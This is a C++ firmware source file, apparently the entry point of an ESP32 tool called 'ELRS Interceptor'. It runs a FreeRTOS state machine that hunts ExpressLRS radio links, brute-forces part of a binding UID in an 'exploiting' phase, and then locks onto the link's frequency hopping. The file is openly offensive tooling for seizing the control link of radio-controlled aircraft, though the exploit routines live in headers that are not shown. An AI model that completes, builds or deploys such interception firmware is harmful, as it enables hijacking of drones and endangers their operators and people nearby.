/**
 * firmware/src/main.cpp
 * ──────────────────────
 * ELRS Interceptor — Entry Point & State Machine
 *
 * Spawns all four phase tasks and manages transitions between them
 * via FreeRTOS direct task notifications.
 *
 * State flow:
 *   HUNTING  →  EXPLOITING  →  LOCKED  →  (HUNTING on fallback)
 *
 * Pinning strategy:
 *   Core 0: system tasks (WiFi, BT — unused here, but reserved)
 *   Core 1: phase3_hop_task (highest priority, time-critical)
 *   Core 1: main_task, phase1, phase2, phase4 (lower priority)
 */

#include "elrs_common.h"
#include "phase1_net.h"
#include "phase2_exploit.h"
#include "phase3_lockons.h"
#include "phase4_autopsy.h"

#include <esp_log.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <esp_timer.h>

static const char *TAG = "MAIN";

// ── Globals (shared across phases) ───────────────────────────────────────────
volatile elrs_uid_t  g_captured_uid   = { .bytes = {0,0,0,0}, .complete = false };
volatile uint8_t     g_sync_seq_num   = 0;

TaskHandle_t g_main_task_handle    = NULL;
TaskHandle_t g_phase1_task_handle  = NULL;
TaskHandle_t g_phase2_task_handle  = NULL;
TaskHandle_t g_phase3_task_handle  = NULL;

static hop_state_t  s_hop_state  = {0};
static rc_frame_t   s_rc_frame   = {0};


// ── State Machine ─────────────────────────────────────────────────────────────

static void main_state_machine(void *pvParameters) {
    g_main_task_handle = xTaskGetCurrentTaskHandle();

    interceptor_state_t state = STATE_HUNTING;

    ESP_LOGI(TAG, "===================================");
    ESP_LOGI(TAG, "  ELRS Interceptor — Boot");
    ESP_LOGI(TAG, "  SF=%d  BW=%dkHz  SyncWord=0x%02X",
             ELRS_SF, ELRS_BW_KHZ, ELRS_SYNC_WORD);
    ESP_LOGI(TAG, "  Hop interval: %llu µs", HOP_INTERVAL_US);
    ESP_LOGI(TAG, "===================================");

    for (;;) {
        // Block until any phase task notifies us of a state change
        uint32_t new_state;
        xTaskNotifyWait(0, ULONG_MAX, &new_state, portMAX_DELAY);
        state = (interceptor_state_t)new_state;

        switch (state) {

            case STATE_HUNTING:
                ESP_LOGI(TAG, "→ STATE: HUNTING");
                // Phase 1 task resumes itself — no action needed here
                break;

            case STATE_EXPLOITING:
                ESP_LOGI(TAG, "→ STATE: EXPLOITING (brute forcing uid[3])");
                // Notify Phase 2 task to start
                xTaskNotifyGive(g_phase2_task_handle);
                break;

            case STATE_LOCKED:
                ESP_LOGI(TAG, "→ STATE: LOCKED — starting synchronized hop");
                // Phase 3 was already started; it self-manages from here.
                // If this is a re-lock after fallback, recreate phase3 task.
                if (g_phase3_task_handle == NULL
                    || eTaskGetState(g_phase3_task_handle) == eDeleted) {
                    phase3_start(&s_hop_state, &s_rc_frame);
                } else {
                    vTaskResume(g_phase3_task_handle);
                }
                break;
        }
    }
}


// ── app_main ─────────────────────────────────────────────────────────────────

extern "C" void app_main(void) {
    // Main state machine task
    xTaskCreatePinnedToCore(
        main_state_machine, "main_sm", 4096, NULL, 5, &g_main_task_handle, 1);

    // Phase 1: Net — waiting on core 1, priority 4
    xTaskCreatePinnedToCore(
        phase1_task, "phase1_net", 4096, NULL, 4, &g_phase1_task_handle, 1);

    // Phase 2: Exploit — waiting on core 1, priority 4
    xTaskCreatePinnedToCore(
        phase2_task, "phase2_exploit", 8192, &s_hop_state, 4,
        &g_phase2_task_handle, 1);

    // Phase 3 is started by main_state_machine on STATE_LOCKED

    // Kick off state machine in HUNTING
    xTaskNotify(g_main_task_handle, (uint32_t)STATE_HUNTING, eSetValueWithOverwrite);
}
